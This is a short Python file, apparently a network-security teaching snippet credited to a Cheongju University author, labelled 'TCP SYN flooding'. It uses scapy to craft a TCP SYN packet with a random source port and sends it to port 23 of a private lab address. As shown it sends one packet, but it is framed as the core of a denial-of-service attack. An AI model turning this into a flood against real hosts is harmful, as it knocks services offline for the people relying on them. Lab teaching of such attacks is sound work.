# All-by-Pythonself
# Snippet for TCP SYN flooding
# by Hae Young Lee
# at Cheongju University

from scapy . all import *

p = IP (dst = "10.0.2.4") / TCP (sport = RandShort (), dport = 23, flags = "S")
send (p)
